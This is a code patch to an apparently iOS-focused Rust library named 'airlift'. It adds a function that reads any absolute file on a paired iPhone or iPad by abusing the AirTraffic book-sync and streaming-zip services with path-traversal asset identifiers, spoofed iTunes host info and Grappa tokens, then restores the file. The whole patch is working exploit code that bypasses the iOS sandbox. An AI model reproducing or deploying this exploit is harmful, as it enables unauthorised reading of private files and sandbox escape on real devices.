@@ -1,0 +1,429 @@
+diff --git a/rust-core/include/airlift.h b/rust-core/include/airlift.h
+index 1ff754d..b7db802 100644
+--- a/rust-core/include/airlift.h
++++ b/rust-core/include/airlift.h
+@@ -89,6 +89,19 @@ int32_t al_exploit_run(const char *pairing_path,
+                         char **out_json,
+                         char **out_error);
+ 
++// Read one absolute iOS file through the AirTraffic exploit.
++// `out_data` is heap-allocated and must be released with al_bytes_free(out_data, out_len).
++int32_t al_exploit_read_file(const char *pairing_path,
++                              const char *ios_path,
++                              ALLogCallback log_cb,
++                              void *ctx,
++                              uint8_t **out_data,
++                              size_t *out_len,
++                              char **out_error);
++
++// Free bytes returned by al_exploit_read_file().
++void al_bytes_free(uint8_t *ptr, size_t len);
++
+ // Write all files from `source_dir` into `target_dir` on the device.
+ // Returns 0 on success, 1 on error (with out_error set).
+ int32_t al_exploit_write_dir(const char *pairing_path,
+diff --git a/rust-core/src/exploit.rs b/rust-core/src/exploit.rs
+index a759c80..5324b2b 100644
+--- a/rust-core/src/exploit.rs
++++ b/rust-core/src/exploit.rs
+@@ -552,6 +552,42 @@ pub unsafe fn run(
+     }
+ }
+ 
++/// Read one absolute iOS file by moving it through AirTraffic, copying it over
++/// AFC, then restoring it to its original location.
++///
++/// # Safety
++/// All pointer args must be null or valid for their documented types.
++pub unsafe fn read_file(
++    pairing_path: *const c_char,
++    ios_path: *const c_char,
++    log_cb: ALLogCallback,
++    ctx: *mut c_void,
++    out_error: *mut *mut c_char,
++) -> Result<Vec<u8>, String> {
++    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
++    let ios_path = opt_str(ios_path, "");
++    let ctx_usize = ctx as usize;
++
++    if ios_path.is_empty() || !ios_path.starts_with('/') {
++        return Err("ios_path must be an absolute path".into());
++    }
++
++    let res = crate::ffi_util::run_with_large_stack("al_exploit_read_file", move || {
++        let logger = Logger { cb: log_cb, ctx: ctx_usize as *mut c_void };
++        idevice_ffi::run_sync_local(exploit_read_file(pairing_path, ios_path, &logger))
++    });
++
++    match res {
++        Ok(result) => result,
++        Err(panic_msg) => {
++            if !out_error.is_null() {
++                *out_error = cstr(panic_msg.clone());
++            }
++            Err(panic_msg)
++        }
++    }
++}
++
+ /// Write all files in `source_dir` directly to `target_dir` on the device outside the sandbox.
+ ///
+ /// # Safety
+@@ -1862,6 +1898,285 @@ async fn exploit_device_respring(
+     }
+ }
+ 
++async fn restore_books_snapshot(
++    afc: &mut AfcClient,
++    original_books_plist: &Option<Vec<u8>>,
++    logger: &Logger,
++) {
++    if let Some(orig) = original_books_plist {
++        if let Ok(mut fd) = afc.open("Books/Sync/Books.plist", AfcFopenMode::WrOnly).await {
++            let _ = fd.write_entire(orig).await;
++            let _ = fd.close().await;
++            logger.log("airlift: restored original Books.plist");
++        }
++    } else {
++        let _ = afc.remove("Books/Sync/Books.plist").await;
++    }
++}
++
++/// Read an absolute iOS file by moving it through AirTraffic into Media,
++/// copying the recovered bytes over AFC, then writing them back.
++async fn exploit_read_file(
++    pairing_path: String,
++    ios_path: String,
++    logger: &Logger,
++) -> Result<Vec<u8>, String> {
++    logger.log(format!("airlift: preparing to read {ios_path}"));
++
++    let path = std::path::Path::new(&ios_path);
++    let target_dir = path
++        .parent()
++        .and_then(|p| p.to_str())
++        .filter(|p| !p.is_empty())
++        .ok_or_else(|| format!("invalid target directory for {ios_path}"))?
++        .to_string();
++    let leaf = path
++        .file_name()
++        .and_then(|n| n.to_str())
++        .filter(|n| !n.is_empty())
++        .ok_or_else(|| format!("invalid file name for {ios_path}"))?
++        .to_string();
++
++    let pairing_bytes = std::fs::read(&pairing_path)
++        .map_err(|e| format!("Failed to read pairing file at {pairing_path}: {e}"))?;
++    let mut tunnel = connect_tunnel(&pairing_bytes, logger).await?;
++    let mut afc = tunnel.connect_afc(logger).await?;
++
++    let original_books_plist = match afc.open("Books/Sync/Books.plist", AfcFopenMode::RdOnly).await {
++        Ok(mut fd) => {
++            let data = fd.read_entire().await.ok();
++            let _ = fd.close().await;
++            data
++        }
++        Err(_) => None,
++    };
++
++    let token = random_hex(10);
++    let source = format!("{}{}", SOURCE_PREFIX, token);
++    let link_destination = format!("{}{}", LINK_PREFIX, token);
++    let recovered_destination = format!("{}{}", RECOVERED_PREFIX, token);
++
++    let link_identifier = format!("../../{source}/p0/p1/p2/link");
++    let target_identifier = posix_rel(&ios_path, AIRLOCK_ROOT);
++    let identifiers = vec![link_identifier, target_identifier];
++    let destinations = vec![link_destination.clone(), recovered_destination.clone()];
++
++    let archive = build_archive(&target_dir, &[])
++        .map_err(|e| format!("build_archive: {e}"))?;
++    let books_plist = build_books_plist(&identifiers)
++        .map_err(|e| format!("build_books_plist: {e}"))?;
++
++    let mut zip_stream = tunnel
++        .connect_service("com.apple.streaming_zip_conduit", logger)
++        .await?;
++    let mut zip_init_dict = plist::Dictionary::new();
++    zip_init_dict.insert("MediaSubdir".to_string(), plist::Value::String(source.clone()));
++    let mut init_buf = Vec::new();
++    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
++        .map_err(|e| format!("encode MediaSubdir: {e}"))?;
++    zip_stream.write_all(&(init_buf.len() as u32).to_be_bytes()).await
++        .map_err(|e| format!("write MediaSubdir length: {e}"))?;
++    zip_stream.write_all(&init_buf).await
++        .map_err(|e| format!("write MediaSubdir body: {e}"))?;
++    zip_stream.write_all(&archive).await
++        .map_err(|e| format!("write archive bytes: {e}"))?;
++    zip_stream.flush().await.map_err(|e| format!("flush archive: {e}"))?;
++    let mut resp_len_buf = [0u8; 4];
++    zip_stream.read_exact(&mut resp_len_buf).await
++        .map_err(|e| format!("read zip response length: {e}"))?;
++    let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
++    let mut resp_body = vec![0u8; resp_len];
++    zip_stream.read_exact(&mut resp_body).await
++        .map_err(|e| format!("read zip response body: {e}"))?;
++    drop(zip_stream);
++
++    let source_link = format!("{source}/p0/p1/p2/link");
++    let source_payload = format!("{source}/payload");
++    if afc.get_file_info(&source).await.is_err()
++        || afc.get_file_info(&source_link).await.is_err()
++        || afc.get_file_info(&source_payload).await.is_err()
++    {
++        let _ = afc.remove_all(&source).await;
++        restore_books_snapshot(&mut afc, &original_books_plist, logger).await;
++        return Err(format!("Stage verification failed while reading {leaf}"));
++    }
++
++    let _ = afc.mk_dir("Airlock").await;
++    let _ = afc.mk_dir("Airlock/Book").await;
++    let _ = afc.mk_dir("Books").await;
++    let _ = afc.mk_dir("Books/Sync").await;
++    let mut books_fd = afc
++        .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
++        .await
++        .map_err(|e| format!("AFC open Books.plist: {e:?}"))?;
++    books_fd.write_entire(&books_plist).await
++        .map_err(|e| format!("AFC write Books.plist: {e:?}"))?;
++    let _ = books_fd.close().await;
++
++    let mut atc_stream = tunnel.connect_service("com.apple.atc", logger).await?;
++    let mut grappa_info: Option<(u32, u32, u32)> = None;
++    for _ in 0..12 {
++        match tokio::time::timeout(std::time::Duration::from_millis(1500), read_atc_dict(&mut atc_stream)).await {
++            Ok(Ok(dict)) => {
++                if let Some(name) = atc_message_name(&dict) {
++                    logger.log(format!("airlift: atc received '{name}' for read '{leaf}'"));
++                    if name == "Capabilities" {
++                        if let Some(params) = dict.get("Params").and_then(|p| p.as_dictionary()) {
++                            if let Some(gi) = params.get("GrappaSupportInfo").and_then(|g| g.as_dictionary()) {
++                                let ver = gi.get("version").and_then(|v| v.as_unsigned_integer()).unwrap_or(1) as u32;
++                                let dt = gi.get("deviceType").and_then(|v| v.as_unsigned_integer()).unwrap_or(0) as u32;
++                                let pv = gi.get("protocolVersion").and_then(|v| v.as_unsigned_integer()).unwrap_or(1) as u32;
++                                grappa_info = Some((ver, dt, pv));
++                            }
++                        }
++                    }
++                    if name == "SyncAllowed" {
++                        break;
++                    }
++                }
++            }
++            Ok(Err(_)) => break,
++            Err(_) => {}
++        }
++    }
++
++    let mut host_info_dict = plist::Dictionary::new();
++    host_info_dict.insert("Type".into(), plist::Value::String("iTunes".into()));
++    host_info_dict.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
++    host_info_dict.insert("MacOSVersion".into(), plist::Value::String("15.0".into()));
++    host_info_dict.insert("SyncHostName".into(), plist::Value::String("airlift".into()));
++    host_info_dict.insert("LibraryID".into(), plist::Value::String(format!("{}-{}-{}-{}-{}", random_hex(4), random_hex(2), random_hex(2), random_hex(2), random_hex(6))));
++    host_info_dict.insert("SyncedDataclasses".into(), plist::Value::Array(vec![plist::Value::String("Book".into())]));
++    host_info_dict.insert("SyncedAssetTypes".into(), plist::Value::Array(vec![plist::Value::String("Book".into())]));
++    host_info_dict.insert("Wakeable".into(), plist::Value::Boolean(false));
++    if let Some(token) = crate::grappa::generate_grappa_token(grappa_info, |s| logger.log(s)) {
++        host_info_dict.insert("Grappa".into(), plist::Value::Data(token));
++    }
++
++    let mut host_info_params = plist::Dictionary::new();
++    host_info_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict.clone()));
++    host_info_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));
++    send_atc_dict(&mut atc_stream, &make_atc_msg("HostInfo", 0, Some(host_info_params))).await?;
++    tokio::time::sleep(std::time::Duration::from_millis(200)).await;
++
++    let mut sync_req_params = plist::Dictionary::new();
++    sync_req_params.insert("Dataclasses".into(), plist::Value::Array(vec![plist::Value::String("Book".into())]));
++    sync_req_params.insert("DataclassAnchors".into(), plist::Value::Dictionary(plist::Dictionary::new()));
++    sync_req_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict));
++    if let Some(token) = crate::grappa::generate_grappa_token(grappa_info, |s| logger.log(s)) {
++        sync_req_params.insert("Grappa".into(), plist::Value::Data(token));
++    }
++    send_atc_dict(&mut atc_stream, &make_atc_msg("RequestingSync", 1, Some(sync_req_params))).await?;
++
++    let mut ready = false;
++    for _ in 0..24 {
++        match tokio::time::timeout(std::time::Duration::from_secs(5), read_atc_dict(&mut atc_stream)).await {
++            Ok(Ok(dict)) => {
++                if let Some(name) = atc_message_name(&dict) {
++                    if name == "Ping" {
++                        let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await;
++                        continue;
++                    }
++                    if name == "ReadyForSync" || name == "AssetManifest" {
++                        ready = true;
++                        break;
++                    }
++                }
++            }
++            Ok(Err(e)) => return Err(format!("ATC read error while reading {leaf}: {e}")),
++            Err(_) => {}
++        }
++    }
++    if !ready {
++        let _ = afc.remove_all(&link_destination).await;
++        let _ = afc.remove_all(&source).await;
++        restore_books_snapshot(&mut afc, &original_books_plist, logger).await;
++        return Err(format!("AirTraffic: ReadyForSync not observed while reading {leaf}"));
++    }
++
++    let mut sync_types = plist::Dictionary::new();
++    sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
++    let mut meta_params = plist::Dictionary::new();
++    meta_params.insert("SyncTypes".into(), plist::Value::Dictionary(sync_types));
++    meta_params.insert("DataclassAnchors".into(), plist::Value::Dictionary(plist::Dictionary::new()));
++    send_atc_dict(&mut atc_stream, &make_atc_msg("FinishedSyncingMetadata", 1, Some(meta_params))).await?;
++
++    let mut manifest_observed = false;
++    for _ in 0..20 {
++        match tokio::time::timeout(std::time::Duration::from_secs(5), read_atc_dict(&mut atc_stream)).await {
++            Ok(Ok(dict)) => {
++                if let Some(name) = atc_message_name(&dict) {
++                    if name == "Ping" {
++                        let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await;
++                        continue;
++                    }
++                    if name == "AssetManifest" {
++                        manifest_observed = true;
++                        break;
++                    }
++                    if name == "SyncFinished" {
++                        break;
++                    }
++                }
++            }
++            Ok(Err(e)) => return Err(format!("ATC manifest read error while reading {leaf}: {e}")),
++            Err(_) => {}
++        }
++    }
++    if !manifest_observed {
++        let _ = afc.remove_all(&link_destination).await;
++        let _ = afc.remove_all(&source).await;
++        restore_books_snapshot(&mut afc, &original_books_plist, logger).await;
++        return Err(format!("AirTraffic: AssetManifest not observed while reading {leaf}"));
++    }
++
++    for (idx, (id, dest)) in identifiers.iter().zip(destinations.iter()).enumerate() {
++        let mut file_complete_params = plist::Dictionary::new();
++        file_complete_params.insert("AssetID".into(), plist::Value::String(id.clone()));
++        file_complete_params.insert("Dataclass".into(), plist::Value::String("Book".into()));
++        file_complete_params.insert("AssetPath".into(), plist::Value::String(dest.clone()));
++        send_atc_dict(&mut atc_stream, &make_atc_msg("FileComplete", 1, Some(file_complete_params))).await?;
++        if idx + 1 < identifiers.len() {
++            tokio::time::sleep(std::time::Duration::from_millis(900)).await;
++        }
++    }
++    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
++    drop(atc_stream);
++
++    let mut recovered: Option<Vec<u8>> = None;
++    for _ in 0..80 {
++        if let Ok(data) = afc.get_file_contents(&recovered_destination).await {
++            recovered = Some(data);
++            break;
++        }
++        tokio::time::sleep(std::time::Duration::from_millis(250)).await;
++    }
++
++    let data = match recovered {
++        Some(data) => data,
++        None => {
++            let _ = afc.remove_all(&link_destination).await;
++            let _ = afc.remove_all(&source).await;
++            restore_books_snapshot(&mut afc, &original_books_plist, logger).await;
++            return Err(format!("AirTraffic did not recover {ios_path}; any moved copy remains in Media"));
++        }
++    };
++
++    if let Err(e) = exploit_write_single_file(&mut tunnel, &mut afc, &target_dir, &leaf, &data, logger).await {
++        let _ = afc.remove_all(&link_destination).await;
++        let _ = afc.remove_all(&source).await;
++        restore_books_snapshot(&mut afc, &original_books_plist, logger).await;
++        return Err(format!("Recovered {ios_path} at {recovered_destination}, but restoring it failed: {e}"));
++    }
++
++    let _ = afc.remove_all(&link_destination).await;
++    let _ = afc.remove_all(&source).await;
++    let _ = afc.remove_all(&recovered_destination).await;
++    restore_books_snapshot(&mut afc, &original_books_plist, logger).await;
++    logger.log(format!("airlift: read {} bytes from {ios_path}", data.len()));
++    Ok(data)
++}
++
+ /// Write a single file payload into target_dir/leaf using the 2-asset AirTraffic escape.
+ /// Matches AirCard's write_file(udid, target_dir, leaf, payload) exactly.
+ async fn exploit_write_single_file(
+diff --git a/rust-core/src/lib.rs b/rust-core/src/lib.rs
+index 698a452..6d03d07 100644
+--- a/rust-core/src/lib.rs
++++ b/rust-core/src/lib.rs
+@@ -113,6 +113,67 @@ pub unsafe extern "C" fn al_exploit_run(
+     }
+ }
+ 
++/// Read one absolute iOS file through the AirTraffic escape and recover it in Media.
++///
++/// `out_data` receives a heap allocation of `out_len` bytes. Release it with
++/// `al_bytes_free(out_data, out_len)` after copying the bytes.
++#[no_mangle]
++pub unsafe extern "C" fn al_exploit_read_file(
++    pairing_path: *const c_char,
++    ios_path: *const c_char,
++    log_cb: exploit::ALLogCallback,
++    ctx: *mut c_void,
++    out_data: *mut *mut u8,
++    out_len: *mut usize,
++    out_error: *mut *mut c_char,
++) -> i32 {
++    if out_data.is_null() || out_len.is_null() {
++        if !out_error.is_null() {
++            *out_error = ffi_util::cstr("out_data and out_len must not be null");
++        }
++        return 2;
++    }
++    *out_data = std::ptr::null_mut();
++    *out_len = 0;
++
++    let res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
++        exploit::read_file(pairing_path, ios_path, log_cb, ctx, out_error)
++    }));
++    match res {
++        Ok(Ok(data)) => {
++            let mut boxed = data.into_boxed_slice();
++            let len = boxed.len();
++            let ptr = boxed.as_mut_ptr();
++            std::mem::forget(boxed);
++            *out_data = ptr;
++            *out_len = len;
++            0
++        }
++        Ok(Err(e)) => {
++            if !out_error.is_null() {
++                *out_error = ffi_util::cstr(e);
++            }
++            1
++        }
++        Err(e) => {
++            if !out_error.is_null() {
++                *out_error = ffi_util::cstr(format!("Rust panic in al_exploit_read_file: {e:?}"));
++            }
++            1
++        }
++    }
++}
++
++/// Free bytes returned by `al_exploit_read_file`.
++#[no_mangle]
++pub unsafe extern "C" fn al_bytes_free(ptr: *mut u8, len: usize) {
++    if ptr.is_null() {
++        return;
++    }
++    let slice = std::ptr::slice_from_raw_parts_mut(ptr, len);
++    let _ = Box::from_raw(slice);
++}
++
+ /// Write all files from `source_dir` into `target_dir` outside the sandbox via AirTraffic exploit.
+ ///
+ /// # Safety
